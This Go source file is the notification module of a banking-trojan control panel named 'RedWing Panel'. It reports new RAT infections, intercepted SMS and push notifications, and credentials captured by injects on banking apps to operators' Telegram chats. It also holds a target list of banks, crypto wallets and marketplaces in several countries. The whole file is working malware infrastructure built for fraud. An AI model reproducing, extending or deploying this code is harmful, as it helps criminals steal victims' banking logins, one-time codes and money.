package api

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"redwing/internal/db"
)

type notifyLang struct {
	NewConnect    string
	Device        string
	Model         string
	Android       string
	Worker        string
	SIM1          string
	SIM1Detecting string
	Applications  string
	Banks         string
	Marketplaces  string
	IncomingSMS   string
	From          string
	Text          string
	PushNotif     string
	App           string
	InjectData    string
	Package       string
	Data          string
	Grabber       string
	Type          string
}

var notifyLangs = map[string]notifyLang{
	"ru": {
		NewConnect:    "🔔 Новый коннект [RAT]",
		Device:        "📱 Device",
		Model:         "📲 Model",
		Android:       "🤖 Android",
		Worker:        "👤 Worker",
		SIM1:          "📞 SIM1",
		SIM1Detecting: "Определяется...",
		Applications:  "📲 Applications",
		Banks:         "🏦 Banks",
		Marketplaces:  "🛒 Marketplaces",
		IncomingSMS:   "📩 Входящее SMS",
		From:          "📤 От",
		Text:          "💬 Текст",
		PushNotif:     "🔔 Push уведомление",
		App:           "📦 App",
		InjectData:    "💳 Инжект данные",
		Package:       "📦 Package",
		Data:          "📝 Данные",
		Grabber:       "🔑 Grabber",
		Type:          "📋 Type",
	},
	"en": {
		NewConnect:    "🔔 New connect [RAT]",
		Device:        "📱 Device",
		Model:         "📲 Model",
		Android:       "🤖 Android",
		Worker:        "👤 Worker",
		SIM1:          "📞 SIM1",
		SIM1Detecting: "Detecting...",
		Applications:  "📲 Applications",
		Banks:         "🏦 Banks",
		Marketplaces:  "🛒 Marketplaces",
		IncomingSMS:   "📩 Incoming SMS",
		From:          "📤 From",
		Text:          "💬 Text",
		PushNotif:     "🔔 Push notification",
		App:           "📦 App",
		InjectData:    "💳 Inject data",
		Package:       "📦 Package",
		Data:          "📝 Data",
		Grabber:       "🔑 Grabber",
		Type:          "📋 Type",
	},
}

func getNotifyLang(teamID string) notifyLang {
	lang := GetSetting(teamID, "tg_notify_lang")
	if l, ok := notifyLangs[lang]; ok {
		return l
	}
	return notifyLangs["ru"]
}

func HandleTelegramTest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}

	var body struct {
		TeamID   string `json:"team_id"`
		BotToken string `json:"bot_token"`
		ChatID   string `json:"chat_id"`
		Channel  string `json:"channel"`
	}
	if json.NewDecoder(r.Body).Decode(&body) != nil {
		writeJSON(w, map[string]any{"error": "invalid json"})
		return
	}

	botToken := body.BotToken
	if botToken == "" && body.TeamID != "" {
		botToken = GetSetting(body.TeamID, "tg_notify_bot_token")
	}

	if botToken == "" || body.ChatID == "" {
		writeJSON(w, map[string]any{"error": "bot_token and chat_id required"})
		return
	}

	ch := body.Channel
	if ch == "" {
		ch = "test"
	}

	err := sendTelegram(botToken, body.ChatID, fmt.Sprintf("✅ RedWing Panel: %s notification OK\n⏱ %s", ch, time.Now().Format("2006-01-02 15:04:05")))
	if err != nil {
		writeJSON(w, map[string]any{"success": false, "error": err.Error()})
		return
	}

	writeJSON(w, map[string]any{"success": true})
}

type appCategory struct {
	icon  string
	label string
}

var appCategories = map[string]appCategory{
	"bank":        {"🏦", "Banks"},
	"marketplace": {"🛒", "Marketplaces"},
	"crypto":      {"₿", "Crypto"},
	"social":      {"💬", "Social"},
	"payment":     {"💳", "Payments"},
}

var knownApps = map[string]struct {
	name     string
	category string
}{
	"ru.sberbankmobile":              {"Сбербанк", "bank"},
	"ru.alfabank.mobile.android":     {"Альфа-Банк", "bank"},
	"ru.tinkoff.investing":           {"Тинькофф", "bank"},
	"com.idamob.tinkoff.android":     {"Тинькофф Банк", "bank"},
	"ru.vtb24.mobilebanking.android": {"ВТБ", "bank"},
	"ru.raiffeisennews":              {"Райффайзен", "bank"},
	"com.openbank":                   {"Открытие", "bank"},
	"ru.mw":                          {"МТС Банк", "bank"},
	"ru.rosbank.android":             {"Росбанк", "bank"},
	"ru.yandex.money":                {"ЮMoney", "bank"},
	"ru.sovcombank.halva":            {"Совкомбанк", "bank"},
	"ru.psbank":                      {"ПСБ", "bank"},
	"ru.bspb":                        {"БСПБ", "bank"},
	"ru.rshb.mbank":                  {"Россельхозбанк", "bank"},
	"com.gazprombank.android":        {"Газпромбанк", "bank"},
	"ru.ubrir.mobile":                {"УБРиР", "bank"},
	"com.homecredit.bank":            {"Хоум Кредит", "bank"},
	"com.chase.sig.android":              {"Chase", "bank"},
	"com.wf.wellsfargomobile":            {"Wells Fargo", "bank"},
	"com.bankofamerica.cashpromobile":     {"Bank of America", "bank"},
	"com.citi.citimobile":                {"Citi", "bank"},
	"com.usaa.mobile.android.usaa":       {"USAA", "bank"},
	"com.capitalone.mobile":              {"Capital One", "bank"},
	"com.paypal.android.p2pmobile":       {"PayPal", "payment"},
	"de.number26.android":                {"N26", "bank"},
	"com.revolut.revolut":                {"Revolut", "bank"},
	"piuk.blockchain.android":            {"Blockchain", "bank"},
	"com.bbva.bbvacontigo":               {"BBVA", "bank"},
	"es.lacaixa.mobile.android.newwapicon": {"CaixaBank", "bank"},
	"com.garanti.cepsubesi":              {"Garanti", "bank"},
	"com.akbank.android.apps.akbank_direkt": {"Akbank", "bank"},
	"com.ykb.android":                    {"Yapı Kredi", "bank"},
	"com.tmobtech.halkbank":              {"Halkbank", "bank"},
	"com.vakifbank.mobile":               {"VakıfBank", "bank"},
	"com.pozitron.iscep":                 {"İş Bankası", "bank"},
	"com.ziraat.ziraatmobil":             {"Ziraat", "bank"},
	"ru.ozon.app.android":      {"Ozon", "marketplace"},
	"com.wildberries.client":   {"Wildberries", "marketplace"},
	"ru.beru.android":          {"Яндекс Маркет", "marketplace"},
	"com.avito.android":        {"Avito", "marketplace"},
	"ru.auto.ara":              {"Авто.ру", "marketplace"},
	"com.alibaba.aliexpresshd": {"AliExpress", "marketplace"},
	"com.amazon.mShop.android.shopping": {"Amazon", "marketplace"},
	"com.ebay.mobile":          {"eBay", "marketplace"},
	"com.shopee.id":            {"Shopee", "marketplace"},
	"com.binance.dev":             {"Binance", "crypto"},
	"com.coinbase.android":        {"Coinbase", "crypto"},
	"com.krakenfx.app":            {"Kraken", "crypto"},
	"com.bybit.app":               {"Bybit", "crypto"},
	"co.mona.android":             {"Trust Wallet", "crypto"},
	"com.wallet.crypto.trustapp": {"Trust Wallet", "crypto"},
	"com.bitfinex.mobileapp":      {"Bitfinex", "crypto"},
	"io.metamask":                 {"MetaMask", "crypto"},
	"com.kucoin.exchange":         {"KuCoin", "crypto"},
	"com.okex.trade":              {"OKX", "crypto"},
	"com.whatsapp":                  {"WhatsApp", "social"},
	"org.telegram.messenger":        {"Telegram", "social"},
	"com.instagram.android":         {"Instagram", "social"},
	"com.facebook.katana":           {"Facebook", "social"},
	"com.vkontakte.android":         {"VK", "social"},
	"com.twitter.android":           {"X (Twitter)", "social"},
	"com.snapchat.android":          {"Snapchat", "social"},
	"com.viber.voip":                {"Viber", "social"},
	"jp.naver.line.android":         {"LINE", "social"},
	"com.qiwi.wallet":               {"QIWI", "payment"},
	"com.google.android.apps.walletnfcrel": {"Google Pay", "payment"},
	"com.samsung.android.spay":      {"Samsung Pay", "payment"},
	"com.apple.android.wallet":      {"Apple Wallet", "payment"},
}

var systemPrefixes = []string{
	"com.android.", "com.google.android.gms", "com.google.android.gsf",
	"com.google.android.ext.", "com.google.android.providers.",
	"com.google.android.inputmethod", "com.google.android.setupwizard",
	"com.google.android.permissioncontroller",
}

func isSystemApp(pkg string) bool {
	for _, prefix := range systemPrefixes {
		if strings.HasPrefix(pkg, prefix) {
			return true
		}
	}
	return false
}

func appDisplayName(pkg, name string) string {
	if known, ok := knownApps[pkg]; ok {
		return known.name
	}
	if name != "" && name != pkg {
		return name
	}
	parts := strings.Split(pkg, ".")
	if len(parts) > 0 {
		last := parts[len(parts)-1]
		if last == "android" || last == "app" || last == "client" {
			if len(parts) > 1 {
				last = parts[len(parts)-2]
			}
		}
		return strings.Title(last)
	}
	return pkg
}

func countryFlag(code string) string {
	code = strings.ToUpper(strings.TrimSpace(code))
	if len(code) != 2 {
		return "🌍"
	}
	return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
}

func SendTelegramNotification(teamID, eventType string, data map[string]string) {
	token := GetSetting(teamID, "tg_notify_bot_token")
	if token == "" {
		return
	}

	chatID := GetSetting(teamID, "tg_notify_"+eventType+"_chat_id")
	if chatID == "" {
		chatID = GetSetting(teamID, "tg_notify_connect_chat_id")
	}
	if chatID == "" {
		return
	}

	nl := getNotifyLang(teamID)

	var text string
	switch eventType {
	case "connect":
		text = buildConnectNotification(teamID, nl, data)
	case "sms":
		text = buildSMSNotification(nl, data)
	case "push":
		text = buildPushNotification(nl, data)
	case "inject":
		text = buildInjectNotification(teamID, nl, data)
	case "grab":
		text = buildGrabNotification(nl, data)
	default:
		text = fmt.Sprintf("ℹ️ %s\n\n%s: %s", eventType, nl.Device, data["device_id"])
	}

	go func() {
		if err := sendTelegram(token, chatID, text); err != nil {
			log.Printf("[TELEGRAM] send failed team=%s type=%s: %v", teamID, eventType, err)
		}
	}()
}

type parsedApp struct {
	pkg  string
	name string
}

func parseAppsList(appsJSON string) []parsedApp {
	var raw []any
	json.Unmarshal([]byte(appsJSON), &raw)

	var result []parsedApp
	for _, a := range raw {
		switch v := a.(type) {
		case string:
			result = append(result, parsedApp{pkg: v})
		case map[string]any:
			pkg, _ := v["package"].(string)
			name, _ := v["name"].(string)
			if pkg == "" && name == "" {
				if p, ok := v["packageName"].(string); ok {
					pkg = p
				}
				if n, ok := v["appName"].(string); ok {
					name = n
				}
				if n, ok := v["label"].(string); ok {
					name = n
				}
			}
			if pkg != "" || name != "" {
				result = append(result, parsedApp{pkg: pkg, name: name})
			}
		}
	}
	return result
}

func buildConnectNotification(teamID string, nl notifyLang, data map[string]string) string {
	deviceID := data["device_id"]
	model := data["model"]
	country := data["country"]

	var androidVer, workerLogin string
	db.DB.QueryRow("SELECT COALESCE(android_version,''), COALESCE(worker_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&androidVer, &workerLogin)

	var appsJSON string
	db.DB.QueryRow("SELECT COALESCE(apps_list, '[]') FROM devices WHERE device_id = ?", deviceID).Scan(&appsJSON)

	apps := parseAppsList(appsJSON)

	var sim1 string
	db.DB.QueryRow("SELECT COALESCE(operator,'') FROM devices WHERE device_id = ?", deviceID).Scan(&sim1)

	var sb strings.Builder
	sb.WriteString(nl.NewConnect + "\n\n")
	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Device, deviceID))
	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Model, model))
	if androidVer != "" {
		sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Android, androidVer))
	}
	if workerLogin != "" {
		sb.WriteString(fmt.Sprintf("\n%s: @%s\n", nl.Worker, workerLogin))
	}
	if sim1 != "" {
		sb.WriteString(fmt.Sprintf("\n%s: %s\n", nl.SIM1, sim1))
	} else {
		sb.WriteString(fmt.Sprintf("\n%s: %s\n", nl.SIM1, nl.SIM1Detecting))
	}

	var userApps []string
	for _, a := range apps {
		if a.pkg != "" && isSystemApp(a.pkg) {
			continue
		}
		userApps = append(userApps, appDisplayName(a.pkg, a.name))
	}

	if len(userApps) > 0 {
		sb.WriteString(fmt.Sprintf("\n%s (%d):\n", nl.Applications, len(userApps)))
		displayCount := 3
		if len(userApps) < displayCount {
			displayCount = len(userApps)
		}
		for i := 0; i < displayCount; i++ {
			sb.WriteString(fmt.Sprintf("  • %s\n", userApps[i]))
		}
		if len(userApps) > 3 {
			sb.WriteString("  ✓\n")
		}
	}

	categories := map[string][]string{}
	for _, a := range apps {
		if known, ok := knownApps[a.pkg]; ok {
			categories[known.category] = append(categories[known.category], known.name)
		}
	}

	categoryOrder := []string{"bank", "crypto", "payment", "marketplace", "social"}
	for _, cat := range categoryOrder {
		names := categories[cat]
		if len(names) == 0 {
			continue
		}
		catInfo := appCategories[cat]
		sb.WriteString(fmt.Sprintf("\n%s %s (%d):\n", catInfo.icon, catInfo.label, len(names)))
		displayCount := 5
		if len(names) < displayCount {
			displayCount = len(names)
		}
		for i := 0; i < displayCount; i++ {
			sb.WriteString(fmt.Sprintf("  ▪ %s\n", names[i]))
		}
		if len(names) > 5 {
			sb.WriteString(fmt.Sprintf("  ... +%d\n", len(names)-5))
		}
	}

	flag := countryFlag(country)
	sb.WriteString(fmt.Sprintf("\n%s %s • 🌐 %s",
		flag, strings.ToUpper(country),
		time.Now().Format("02.01.2006 15:04:05"),
	))

	return sb.String()
}

func buildSMSNotification(nl notifyLang, data map[string]string) string {
	return fmt.Sprintf(
		"%s\n\n%s: %s\n%s: %s\n\n%s:\n%s",
		nl.IncomingSMS,
		nl.Device, data["device_id"],
		nl.From, data["from"],
		nl.Text, truncate(data["body"], 500),
	)
}

func buildPushNotification(nl notifyLang, data map[string]string) string {
	return fmt.Sprintf(
		"%s\n\n%s: %s\n%s: %s\n\n📋 %s\n%s",
		nl.PushNotif,
		nl.Device, data["device_id"],
		nl.App, data["package"],
		data["title"],
		truncate(data["text"], 300),
	)
}

func buildInjectNotification(teamID string, nl notifyLang, data map[string]string) string {
	deviceID := data["device_id"]
	appName := data["app"]
	pkg := data["package"]

	var model string
	db.DB.QueryRow("SELECT COALESCE(model,'') FROM devices WHERE device_id = ?", deviceID).Scan(&model)

	var capturedData string
	db.DB.QueryRow(
		"SELECT captured_data FROM inject_data WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 1",
		deviceID, teamID,
	).Scan(&capturedData)

	var sb strings.Builder
	sb.WriteString(nl.InjectData + "\n\n")
	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Device, deviceID))
	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Model, model))
	sb.WriteString(fmt.Sprintf("🏦 %s: %s\n", nl.App, appName))
	sb.WriteString(fmt.Sprintf("%s: %s\n", nl.Package, pkg))

	if capturedData != "" {
		var parsed map[string]any
		if json.Unmarshal([]byte(capturedData), &parsed) == nil {
			sb.WriteString(fmt.Sprintf("\n%s:\n", nl.Data))
			for k, v := range parsed {
				if k == "device_id" || k == "team_id" || k == "target_package" || k == "app_name" || k == "type" {
					continue
				}
				sb.WriteString(fmt.Sprintf("  %s: %v\n", k, v))
			}
		}
	}

	return sb.String()
}

func buildGrabNotification(nl notifyLang, data map[string]string) string {
	return fmt.Sprintf(
		"%s\n\n%s: %s\n%s: %s",
		nl.Grabber,
		nl.Device, data["device_id"],
		nl.Type, data["type"],
	)
}

func sendTelegram(botToken, chatID, text string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	resp, err := http.PostForm(apiURL, url.Values{
		"chat_id":    {chatID},
		"text":       {text},
		"parse_mode": {"HTML"},
	})
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		var result map[string]any
		json.NewDecoder(resp.Body).Decode(&result)
		desc, _ := result["description"].(string)
		return fmt.Errorf("telegram API error %d: %s", resp.StatusCode, desc)
	}

	return nil
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func HandleNotifySettings(w http.ResponseWriter, r *http.Request) {
	teamID := SessionTeamID(r)

	switch r.Method {
	case http.MethodGet:
		keys := []string{
			"tg_notify_bot_token",
			"tg_notify_connect_chat_id", "tg_notify_sms_chat_id",
			"tg_notify_push_chat_id", "tg_notify_inject_chat_id",
			"tg_notify_lang",
		}
		result := map[string]any{}
		for _, k := range keys {
			v := GetSetting(teamID, k)
			if strings.Contains(k, "token") && len(v) > 8 {
				v = v[:4] + "••••" + v[len(v)-4:]
			}
			result[k] = v
		}
		writeJSON(w, result)
	case http.MethodPost:
		var body map[string]any
		if json.NewDecoder(r.Body).Decode(&body) != nil {
			writeJSON(w, map[string]any{"error": "invalid json"})
			return
		}
		for k, v := range body {
			if !strings.HasPrefix(k, "tg_") && !strings.HasPrefix(k, "notify_") {
				continue
			}
			val := fmt.Sprintf("%v", v)
			if strings.Contains(val, "••••") {
				continue
			}
			db.DB.Exec(
				"INSERT INTO team_settings (team_id, key, value) VALUES (?, ?, ?) ON CONFLICT(team_id, key) DO UPDATE SET value = ?",
				teamID, k, val, val,
			)
		}
		writeJSON(w, map[string]any{"success": true})
	default:
		writeJSON(w, map[string]any{"error": "method not allowed"})
	}
}
